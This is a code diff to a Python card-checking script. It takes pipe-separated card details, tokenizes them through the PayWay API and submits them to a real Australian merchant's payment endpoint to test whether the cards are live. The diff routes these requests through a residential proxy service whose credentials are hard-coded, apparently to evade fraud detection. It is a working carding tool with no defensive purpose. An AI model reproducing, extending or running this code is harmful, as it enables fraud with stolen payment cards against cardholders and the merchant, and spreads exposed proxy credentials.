@@ -1,6 +1,10 @@
 import requests,re
+import random
+from proxy import reqproxy, make_request
 def Tele(ccx):
-	import requests
+	proxy_str = "bd.porterproxies.com:8888:user-PP_FBBG3PY7GO-country-US-plan-luminati:nsugwlie"
+	session, ip = reqproxy(proxy_str)
+	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -43,7 +47,7 @@ def Tele(ccx):
 	    'threeDS2': 'false',
 	}
 	
-	response = requests.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
+	response = session.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
 	
 	tok = response.json()['singleUseTokenId']
 	#print(tok)
@@ -76,7 +80,7 @@ def Tele(ccx):
 	    'singleUseTokenId': f'{tok}',
 	}
 	
-	response = requests.post('https://www.hutcheonandpearce.com.au/process-payment', headers=headers, data=data)
+	response = session.post('https://www.hutcheonandpearce.com.au/process-payment', headers=headers, data=data)
 	
 	try:
 		result = re.search(r'<br>Response Text : (.*?)      </div>', response.text).group(1)
